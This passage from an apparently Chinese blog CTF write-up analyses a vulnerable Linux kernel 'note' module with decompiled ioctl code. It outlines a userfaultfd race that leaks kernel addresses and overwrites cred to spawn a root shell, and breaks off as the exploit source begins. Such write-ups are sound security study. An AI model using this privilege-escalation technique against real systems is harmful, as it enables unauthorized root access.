class="line"><span class="comment">00000000                                         ; unlocked_ioctl+6A/r ...</span></span><br><span class="line"><span class="comment">00000008 length          dq ?                    ; XREF: unlocked_ioctl+2E/w</span></span><br><span class="line"><span class="comment">00000008                                         ; unlocked_ioctl+6E/r ...</span></span><br><span class="line"><span class="comment">00000010 user_buf        dq ?                    ; XREF: unlocked_ioctl+4D/w</span></span><br><span class="line"><span class="comment">00000010                                         ; unlocked_ioctl:loc_1AE/r ...</span></span><br><span class="line"><span class="comment">00000018 UserAttr        ends</span></span><br><span class="line"><span class="comment">00000018</span></span><br><span class="line"><span class="comment">00000000 ; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">00000000</span></span><br><span class="line"><span class="comment">00000000 node            struc ; (sizeof=0x118, mappedto_4)</span></span><br><span class="line"><span class="comment">00000000 key             dq ?</span></span><br><span class="line"><span class="comment">00000008 length          dq ?</span></span><br><span class="line"><span class="comment">00000010 contentPtr      dq ?</span></span><br><span class="line"><span class="comment">00000018 content_arr     db 256 dup(?)</span></span><br><span class="line"><span class="comment">00000118 node            ends</span></span><br><span class="line"><span class="comment">00000118</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>从<code>init_module</code>开始，注册了一个设备在0x620，设备名下面就是用户自己定义的<code>file_ops</code>,而0x680全是空，也就是说全部使用默认的操作函数。看下源码会发现这里的<code>ioctl</code>是<code>unlocked_ioctl</code>也就是存在竞争</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">init_module</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(a1, a2, a3);</span><br><span class="line">  bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">  <span class="keyword">return</span> misc_register(&amp;dev);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">.data:0000000000000620 0B                      dev             db  0Bh                 ; DATA XREF: init_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000620                                                                 ; cleanup_module+5↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000621 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000622 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000623 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000624 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000625 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000626 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000627 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000628 9C 04 00 00 00 00 00 00                 dq offset aNote         ; "note"</span></span><br><span class="line"><span class="comment">.data:0000000000000630 80 06 00 00 00 00 00 00                 dq offset unk_680</span></span><br><span class="line"><span class="comment">.data:0000000000000638 00 00 00 00 00 00 00 00+                align 80h</span></span><br><span class="line"><span class="comment">.data:0000000000000680 00                      unk_680         db    0                 ; DATA XREF: .data:0000000000000630↑o</span></span><br><span class="line"><span class="comment">.data:0000000000000681 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000682 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000683 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000684 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000685 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000686 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000687 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000688 00                                      db    0</span></span><br><span class="line"><span class="comment">.data:0000000000000689 00                                      db    0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// file_operations结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line">    <span class="keyword">int</span> (*iopoll)(struct kiocb *kiocb, <span class="keyword">bool</span> spin);</span><br><span class="line">    <span class="keyword">int</span> (*iterate) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">int</span> (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line">    <span class="keyword">__poll_t</span> (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line">    <span class="keyword">long</span> (*unlocked_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl) (struct file *, <span class="keyword">unsigned</span> <span class="keyword">int</span>, <span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    ... truncated</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>继续分析模块的功能会发现实现了四个功能，分别是<code>New</code>、<code>Delete</code>、<code>Show</code>和<code>Edit</code>。其中New的功能就是根据用户给的length从全局的内存中取一块作为<code>notes[req.idx]</code>并分配一块<code>content_arr[length]</code>，之后将全局指针对应向后偏移，拷贝的用户数据要先异或<code>key</code>再存入其中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">if ( (unsigned int)arg2 &lt;= -'\xFF' )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-256</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br><span class="line">    req.idx = <span class="number">-1L</span>L;                             <span class="comment">// -256-&gt;new</span></span><br><span class="line">    idx2 = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      idx3 = (<span class="keyword">signed</span> <span class="keyword">int</span>)idx2;</span><br><span class="line">      <span class="keyword">if</span> ( !notes[idx2] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++idx2 == <span class="number">0x10</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-14</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    new_node = bufPtr;</span><br><span class="line">    req.idx = idx3;</span><br><span class="line">    notes[idx3] = bufPtr;</span><br><span class="line">    new_node-&gt;length = v4;</span><br><span class="line">    new_node_content_arr = new_node-&gt;content_arr;</span><br><span class="line">    new_node-&gt;key = *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">0x7E8</span>) + <span class="number">0x50</span>LL);</span><br><span class="line">    user_n = req.length;</span><br><span class="line">    user_buf2 = req.user_buf;</span><br><span class="line">    bufPtr = (node *)((<span class="keyword">char</span> *)new_node + req.length + <span class="number">24</span>);<span class="comment">// mov it to next free space</span></span><br><span class="line">    <span class="keyword">if</span> ( req.length &gt; <span class="number">0x100</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      _warn_printk(<span class="string">"Buffer overflow detected (%d &lt; %lu)!\n"</span>, <span class="number">0x100</span>LL, req.length);</span><br><span class="line">      BUG();</span><br><span class="line">    &#125;</span><br><span class="line">    _check_object_size(encBuffer, req.length, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf2, user_n);<span class="comment">// copy userbuf to stack</span></span><br><span class="line">    req_len = req.length;</span><br><span class="line">    node_addr2 = notes[req.idx];</span><br><span class="line">    <span class="keyword">if</span> ( req.length )</span><br><span class="line">    &#123;</span><br><span class="line">      i = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[i / <span class="number">8</span>] ^= node_addr2-&gt;key;    <span class="comment">// xor the key</span></span><br><span class="line">        i += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; req_len );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(new_node_content_arr, encBuffer, req_len);<span class="comment">// copy to the third node</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    node_addr2-&gt;contentPtr = (__int64)&amp;new_node_content_arr[-page_offset_base];<span class="comment">// set contentPtr</span></span><br></pre></td></tr></table></figure>
<p><code>Delete</code>函数清空全局内存区并将分配的指针指向开头。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (_DWORD)arg2 != <span class="number">-254</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      notes1 = notes;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)arg2 == <span class="number">-253</span> )               <span class="comment">// -253-&gt;delete</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          *notes1 = <span class="number">0L</span>L;</span><br><span class="line">          ++notes1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( &amp;_check_object_size != (__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))notes1 );</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        bufPtr = (node *)&amp;unk_B60;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;unk_B60, <span class="number">0</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-25</span>;</span><br></pre></td></tr></table></figure>
<p><code>Show</code>函数按照<code>notes[idx].length</code>把<code>content_arr</code>内容拷贝到用户态空间，这个过程是先拿<code>contentPtr+page_offset_base</code>找到<code>content_arr</code>，再把其中的内容异或<code>key</code>拷贝</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v10 = notes[idx];                           <span class="comment">// -254-&gt;show</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = LOBYTE(v10-&gt;length);</span><br><span class="line">      v12 = (_DWORD *)(v10-&gt;contentPtr + page_offset_base);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>] + LOBYTE(v10-&gt;length)) = *(_QWORD *)((<span class="keyword">char</span> *)v12 + LOBYTE(v10-&gt;length) - <span class="number">8</span>);</span><br><span class="line">        qmemcpy(encBuffer, v12, <span class="number">8L</span>L * ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v11 - <span class="number">1</span>) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v11 &amp; <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        LODWORD(encBuffer[<span class="number">0</span>]) = *v12;</span><br><span class="line">        *(_DWORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( LOBYTE(v10-&gt;length) )</span><br><span class="line">      &#123;</span><br><span class="line">        LOBYTE(encBuffer[<span class="number">0</span>]) = *(_BYTE *)v12;</span><br><span class="line">        <span class="keyword">if</span> ( v11 &amp; <span class="number">2</span> )</span><br><span class="line">          *(_WORD *)((<span class="keyword">char</span> *)encBuffer + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)v12 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11 - <span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v11 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = <span class="number">0L</span>L;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          encBuffer[v13 / <span class="number">8</span>] ^= v10-&gt;key;</span><br><span class="line">          v13 += <span class="number">8L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v13 &lt; v11 );</span><br><span class="line">      &#125;</span><br><span class="line">      user_buf3 = req.user_buf;</span><br><span class="line">      _check_object_size(encBuffer, v11, <span class="number">1L</span>L);</span><br><span class="line">      copy_to_user(user_buf3, encBuffer, v11);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Edit函数和Show差不多，也是先计算再拷贝，这里的问题就是<code>copy_from_user</code>并不是原子性的操作，也并没有上锁，按照我们之前的分析缺页可以让其有一个很大的空窗期供我们操作，进而利用竞争改掉某些关键数据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">if ( (_DWORD)arg2 == -'\xFF' )                // -255-&gt;edit</span><br><span class="line">&#123;</span><br><span class="line">  node_addr = notes[idx];</span><br><span class="line">  <span class="keyword">if</span> ( node_addr )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_size = LOBYTE(node_addr-&gt;length);</span><br><span class="line">    user_buf1 = req.user_buf;</span><br><span class="line">    v18 = (_QWORD *)(node_addr-&gt;contentPtr + page_offset_base);<span class="comment">// recover</span></span><br><span class="line">    _check_object_size(encBuffer, chunk_size, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(encBuffer, user_buf1, chunk_size);</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      node_addr1 = notes[req.idx];</span><br><span class="line">      cpy_idx = <span class="number">0L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        encBuffer[cpy_idx / <span class="number">8</span>] ^= node_addr1-&gt;key;</span><br><span class="line">        cpy_idx += <span class="number">8L</span>L;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( chunk_size &gt; cpy_idx );</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size &gt;= <span class="number">8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">        *(_QWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">8</span>) = *(__int64 *)((<span class="keyword">char</span> *)&amp;encBuffer[<span class="number">-1</span>]</span><br><span class="line">                                                                             + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">        qmemcpy(</span><br><span class="line">          (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL),</span><br><span class="line">          (<span class="keyword">const</span> <span class="keyword">void</span> *)((<span class="keyword">char</span> *)encBuffer - ((<span class="keyword">char</span> *)v18 - ((<span class="keyword">unsigned</span> __int64)(v18 + <span class="number">1</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFF8</span>LL))),</span><br><span class="line">          <span class="number">8L</span>L * (((<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size + (_DWORD)v18 - (((_DWORD)v18 + <span class="number">8</span>) &amp; <span class="number">0xFFFFFFF8</span>)) &gt;&gt; <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( chunk_size &amp; <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      *(_DWORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">4</span>) = *(_DWORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)chunk_size )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)v18 = encBuffer[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span> ( chunk_size &amp; <span class="number">2</span> )</span><br><span class="line">        *(_WORD *)((<span class="keyword">char</span> *)v18 + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size - <span class="number">2</span>) = *(_WORD *)((<span class="keyword">char</span> *)encBuffer</span><br><span class="line">                                                                          + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_size</span><br><span class="line">                                                                          - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们先创建一个buf为0x10大小的note0，在Edit的过程中我们利用usefaultfd的handler在成功拷贝之前释放所有note，再创建一个新的Note0和Note1，其buf大小均为0，在使用ioctl向缺页部分拷贝的时候我们把这个页的<code>buf[8]</code>改为<code>0xf0</code>，这样拷贝之后原来<code>buf[8]</code>的部分实际上是<code>note1.length</code>，进而我们可以越界读写<code>note1</code>。</p>
<ol>
<li>leak key:直接<code>Show(1)</code>，因为我们把note1的length改为了非零值，因此会输出<code>0 xor key</code>，得到Key值</li>
<li>leak module base:注意我们现在泄露的只是一个相对值(module_base-page_offset_base)，但是无所谓，因为最终show的时候会加上这个偏移。创建Note2则<code>note2.contentPtr</code>即为<code>note2.content_arr-page_offset_base</code>，show(1)即可泄露出来这个值，再减去它到模块基地址的偏移即为模块相对基址</li>
<li>leak page_offset_base:泄露这个值就比较麻烦了，我们先来看一个指令<code>000000001F7 4C 8B 25 12 2A 00 00                    mov     r12, cs:page_offset_base</code>，这个调用实际含义是<code>mov r12,[rip+offset]</code>，而这个offset存储在<code>module_base+0x1fa</code>，我们的思路就有了，先修改note2的key为0，length为4，contentPtr为<code>module_base+0x1fa</code>，得到这个4字节的偏移，再用相同方式泄露出<code>(module_base+0x1fe)+offset</code>的值，即为所求</li>
<li>leak cred:通过之前提到的search搜索的方式</li>
<li>用任意写修改cred的对应数据位</li>
<li>execv(注意不是execve)起新的shell(这个shell会继承当前进程的uid)</li>
</ol>
<h4 id="exp-c-5"><a href="#exp-c-5" class="headerlink" title="exp.c"></a>exp.c</h4><p>如前所述基本是照着打了一遍，再次感谢<code>bsauce</code>师傅的文章</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span 